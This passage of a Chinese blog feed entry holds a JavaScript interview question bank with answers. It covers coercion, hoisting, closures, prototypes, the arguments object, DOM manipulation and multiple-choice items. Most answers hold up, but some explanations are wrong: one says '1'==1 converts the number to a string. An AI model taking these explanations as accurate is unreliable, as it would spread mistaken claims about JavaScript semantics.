class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：”26”</p><p>8）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a /</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>); <span class="comment">// !Infinity --&gt;false</span></span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：Infinity24</p><ol><li>用程序实现找到html中id名相同的元素？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=<span class="string">'form1'</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div1'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div2'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div4'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div5'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;id名重复的元素&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> nodes = <span class="built_in">document</span>.querySelectorAll(<span class="string">"#form1&gt;*"</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = nodes.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> attr = nodes[i].getAttribute(<span class="string">"id"</span>);</span><br><span class="line">        <span class="keyword">var</span> s=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(nodes[j].getAttribute(<span class="string">"id"</span>) == attr)&#123;</span><br><span class="line">            s++;</span><br><span class="line">            alert(<span class="string">"id为："</span> + attr + <span class="string">"的元素出现"</span> + s + <span class="string">"次"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><p>输出结果：id为：div3的元素出现2次</p><h2 id="下列JavaScript代码执行后，运行的结果是"><a href="#下列JavaScript代码执行后，运行的结果是" class="headerlink" title="下列JavaScript代码执行后，运行的结果是"></a>下列JavaScript代码执行后，运行的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id=<span class="string">'btn'</span>&gt;点击我&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var btn = document.getElementById('btn');</span></span><br><span class="line"><span class="regexp">  var handler = &#123;</span></span><br><span class="line"><span class="regexp">      id: '_eventHandler',</span></span><br><span class="line"><span class="regexp">      exec: function()&#123;</span></span><br><span class="line"><span class="regexp">          alert(this.id);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  btn.addEventListener('click', handler.exec);</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>输出结果：”btn”</p><h2 id="下列JavaScript代码执行后，依次-alert-的结果"><a href="#下列JavaScript代码执行后，依次-alert-的结果" class="headerlink" title="下列JavaScript代码执行后，依次 alert 的结果"></a>下列JavaScript代码执行后，依次 alert 的结果</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">proto</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">F.prototype = obj.proto;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line">obj.proto.c = <span class="number">3</span>;</span><br><span class="line">obj.proto = &#123;<span class="attr">a</span>:<span class="number">-1</span>, <span class="attr">b</span>:<span class="number">-2</span>&#125;;</span><br><span class="line">alert(f.a); <span class="comment">// 1</span></span><br><span class="line">alert(f.c); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">delete</span> F.prototype[<span class="string">'a'</span>];</span><br><span class="line">alert(f.a); <span class="comment">// undefined</span></span><br><span class="line">alert(obj.proto.a);  <span class="comment">// -1</span></span><br></pre></td></tr></table></figure><h2 id="下列JavaScript代码执行后的效果是"><a href="#下列JavaScript代码执行后的效果是" class="headerlink" title="下列JavaScript代码执行后的效果是"></a>下列JavaScript代码执行后的效果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=<span class="string">'list'</span>&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> items = <span class="built_in">document</span>.querySelectorAll(<span class="string">'#list &gt; li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      items[i].style.backgroundColor = <span class="string">'#fee'</span>;</span><br><span class="line">    &#125;, <span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：报错，因为i一直等于5，items[i]获取不到元素</p><h2 id="下列JavaScript代码执行后的-li-元素的数量是"><a href="#下列JavaScript代码执行后的-li-元素的数量是" class="headerlink" title="下列JavaScript代码执行后的 li 元素的数量是"></a>下列JavaScript代码执行后的 li 元素的数量是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;Item&lt;/</span>li&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var items = document.getElementsByTagName('li');</span></span><br><span class="line"><span class="regexp">  for(var i = 0; i &lt; items.length; i++)&#123;</span></span><br><span class="line"><span class="regexp">    if(items[i].innerHTML == '')&#123;</span></span><br><span class="line"><span class="regexp">      items[i].parentNode.removeChild(items[i]);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>结果是：4</p><h2 id="程序中捕获异常的方法"><a href="#程序中捕获异常的方法" class="headerlink" title="程序中捕获异常的方法"></a>程序中捕获异常的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.error;</span><br><span class="line">try&#123;&#125;catch()&#123;&#125;finally&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="原型对象上添加方法"><a href="#原型对象上添加方法" class="headerlink" title="原型对象上添加方法"></a>原型对象上添加方法</h2><p>给String对象添加一个方法，传入一个 string 类型的参数，然后将 string 的每个字符间价格空格返回<br>例如：<code>addSpace(&quot;hello world&quot;) // -&gt; &#39;h e l l o w o r l d&#39;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.spacify = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.split(<span class="string">''</span>).join(<span class="string">' '</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组和字符串"><a href="#数组和字符串" class="headerlink" title="数组和字符串"></a>数组和字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outPut</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.writeln(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"lashou"</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">outPut(b);</span><br><span class="line">a = <span class="string">"拉手"</span>;</span><br><span class="line">outPut(a);</span><br><span class="line">outPut(b);</span><br><span class="line"><span class="keyword">var</span> a_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b_array = a_array;</span><br><span class="line">outPut(b_array);</span><br><span class="line">a_array[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">outPut(a_array);</span><br><span class="line">outPut(b_array);</span><br></pre></td></tr></table></figure><p>输出结果：lashou 拉手 lashou 1,2,3 1,2,3,4 1,2,3,4</p><h2 id="下列控制台都输出什么"><a href="#下列控制台都输出什么" class="headerlink" title="下列控制台都输出什么"></a>下列控制台都输出什么</h2><p>第1题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setName()&#123;</span><br><span class="line">  name=&quot;张三&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setName();</span><br><span class="line">console.log(name); // 答案：&quot;张三&quot;</span><br></pre></td></tr></table></figure><p>第2题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//考点：1、变量声明提升 2、变量搜索机制</span><br><span class="line">var a=1;</span><br><span class="line">function test()&#123;</span><br><span class="line">  console.log(a); // 答案：undefined</span><br><span class="line">  var a=1;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure><p>第3题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var b=2;</span><br><span class="line">function test2()&#123;</span><br><span class="line">  window.b=3;</span><br><span class="line">  console.log(b); // 答案：3</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br></pre></td></tr></table></figure><p>第4题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=5;//声明一个全局变量c </span><br><span class="line">function test3()&#123;</span><br><span class="line">  window.c=3;</span><br><span class="line">  console.log(c);   //答案：undefined，原因：由于此时的c是一个局部变量c，并且没有被赋值</span><br><span class="line">  var c;</span><br><span class="line">  console.log(window.c);//答案：3，原因：这里的c就是一个全局变量c</span><br><span class="line">&#125;</span><br><span class="line">test3();</span><br></pre></td></tr></table></figure><p>第5题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];</span><br><span class="line">arr[0]  = &apos;a&apos;;</span><br><span class="line">arr[1]  = &apos;b&apos;;</span><br><span class="line">arr[10] = &apos;c&apos;;</span><br><span class="line">alert(arr.length);  //答案：11</span><br><span class="line">console.log(arr[5]);  //答案：undefined</span><br></pre></td></tr></table></figure><p>第6题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=1;</span><br><span class="line">console.log(a++);   //答案：1</span><br><span class="line">console.log(++a);   //答案：3</span><br></pre></td></tr></table></figure><p>第7题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(null==undefined); //答案：true</span><br><span class="line">console.log(&quot;1&quot;==1);    //答案：true，因为会将数字1先转换为字符串1</span><br><span class="line">console.log(&quot;1&quot;===1);   //答案：false，因为数据类型不一致</span><br></pre></td></tr></table></figure><p>第8题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof 1;   &quot;number&quot;</span><br><span class="line">typeof &quot;hello&quot;;   &quot;string&quot;</span><br><span class="line">typeof /[0-9]/;   &quot;object&quot;</span><br><span class="line">typeof &#123;&#125;;    &quot;object&quot;</span><br><span class="line">typeof null;    &quot;object&quot;</span><br><span class="line">typeof undefined; &quot;undefined&quot;</span><br><span class="line">typeof [1,2,3];   &quot;object&quot;</span><br><span class="line">typeof function()&#123;&#125;;  //&quot;function&quot;</span><br></pre></td></tr></table></figure><p>第9题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parseInt(3.14);     //3</span><br><span class="line">parseFloat(&quot;3asdf&quot;);    //3</span><br><span class="line">parseInt(&quot;1.23abc456&quot;);</span><br><span class="line">parseInt(true);//&quot;true&quot; NaN</span><br></pre></td></tr></table></figure><p>第10题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//考点：函数声明提前</span><br><span class="line">function bar() &#123;</span><br><span class="line">    return foo;</span><br><span class="line">    foo = 10;</span><br><span class="line">    function foo() &#123;&#125;</span><br><span class="line">    //var foo = 11;</span><br><span class="line">&#125;</span><br><span class="line">alert(typeof bar());//&quot;function&quot;</span><br></pre></td></tr></table></figure><p>第11题：考点：函数声明提前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line">function bar() &#123;</span><br><span class="line">  foo = 10;</span><br><span class="line">  return;</span><br><span class="line">  function foo() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">alert(foo);// 1</span><br></pre></td></tr></table></figure><p>第12题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.log(a);//是一个函数</span><br><span class="line">var a = 3;</span><br><span class="line">function a()&#123;&#125;</span><br><span class="line">console.log(a);////3</span><br></pre></td></tr></table></figure><p>第13题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//考点：对arguments的操作</span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    arguments[0] = 2;</span><br><span class="line">    alert(a);//答案：2，因为：a、arguments是对实参的访问，b、通过arguments[i]可以修改指定实参的值</span><br><span class="line">&#125;</span><br><span class="line">foo(1);</span><br></pre></td></tr></table></figure><p>第14题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">  alert(arguments.length);//答案：3，因为arguments是对实参的访问</span><br><span class="line">&#125;</span><br><span class="line">foo(1, 2, 3);</span><br></pre></td></tr></table></figure><p>第15题:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bar();//报错</span><br><span class="line">var foo = function bar(name) &#123;</span><br><span class="line">  console.log(&quot;hello&quot;+name);</span><br><span class="line">  console.log(bar);</span><br><span class="line">&#125;;</span><br><span class="line">//alert(typeof bar);</span><br><span class="line">foo(&quot;world&quot;);//&quot;hello&quot;</span><br><span class="line">console.log(bar);//undefined</span><br><span class="line">console.log(foo.toString());</span><br><span class="line">bar();//报错</span><br></pre></td></tr></table></figure><p>第16题：以下执行会有什么输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">  console.log(&quot;test函数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(&quot;定时器回调函数&quot;);</span><br><span class="line">&#125;, 0)</span><br><span class="line">test();</span><br></pre></td></tr></table></figure><p>结果：</p><p>test函数<br>定时器回调函数</p><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><strong>以下哪些是javascript的全局函数：( ABC )</strong></p><p>A. escape 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。ECMAScript v3 反对使用该方法，应用使用 decodeURI() 和 decodeURIComponent() 替代它。<br>B. parseFloat parseFloat() 函数可解析一个字符串，并返回一个浮点数。该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。<br>C. eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>D. setTimeout<br>E. alert</p><p><strong>关于IE的window对象表述正确的有：( ACD )</strong></p><p>A. window.opener属性本身就是指向window对象<br>B. window.reload()方法可以用来刷新当前页面 应该是location.reload或者window.location.reload<br>C. window.location=”a.html”和window.location.href=”a.html”的作用都是把当前页面替换成a.html页面<br>D. 定义了全局变量g；可以用window.g的方式来存取该变量</p><p><strong>下面正确的是 ( A )</strong></p><p>A: 跨域问题能通过JsonP方案解决<br>B：不同子域名间仅能通过修改window.name解决跨域还可以通过script标签src，jsonp等h5 Java split等<br>C：只有在IE中可通过iframe嵌套跨域<br>D：MediaQuery属性是进行视频格式检测的属性是做响应式的</p><p><strong>错误的是 ( B )</strong></p><p>A: Ajax本质是XMLHttpRequest<br>B: 块元素实际占用的宽度与它的width、border、padding属性有关，与background无关<br>C: position属性absolute、fixed、—relative—会使文档脱标<br>D: float属性left也会使div脱标</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h2&gt;&lt;h3 id=&quot;写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串&quot;&gt;&lt;a href=&quot;#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串&quot; class=&quot;headerlink&quot; title=&quot;写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串&quot;&gt;&lt;/a&gt;写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串&lt;/h3&gt;&lt;p&gt;&lt;code&gt;^[a-zA-Z]{1}[\w]{5,29}$&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;写出正确的正则表达式匹配固话号&quot;&gt;&lt;a href=&quot;#写出正确的正则表达式匹配固话号&quot; class=&quot;headerlink&quot; title=&quot;写出正确的正则表达式匹配固话号&quot;&gt;&lt;/a&gt;写出正确的正则表达式匹配固话号&lt;/h3&gt;&lt;p&gt;区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号&lt;/p&gt;
&lt;p&gt;&lt;code&gt;^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot;&gt;&lt;a href=&quot;#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot; class=&quot;headerlink&quot; title=&quot;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot;&gt;&lt;/a&gt;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&lt;/h3&gt;&lt;p&gt;&lt;code&gt;^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;输出结果是&quot;&gt;&lt;a href=&quot;#输出结果是&quot; class=&quot;headerlink&quot; title=&quot;输出结果是&quot;&gt;&lt;/a&gt;输出结果是&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var bool = !!2; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(bool)；//true;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;双向非操作可以把字符串和数字转换为布尔值。&lt;/p&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
</feed>
